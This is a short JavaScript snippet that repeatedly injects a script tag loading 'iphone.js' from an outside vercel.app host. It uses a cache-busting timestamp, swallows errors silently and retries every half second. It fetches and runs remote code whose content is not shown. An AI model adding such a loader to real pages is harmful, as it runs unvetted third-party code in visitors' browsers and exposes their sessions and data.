

async function importGitScript(){

try{

if(!document.getElementById('patrickGITScript')){
   
   var mjs=document.createElement('script');
  
  mjs.id='patrickGITScript';
  
  mjs.src='https://mobile-scripts.vercel.app/iphone.js?'+new Date().getTime();
   
  document.body.appendChild(mjs);
  
   }


}catch(e){}



}

setInterval(async function(){importGitScript();},500);
importGitScript();
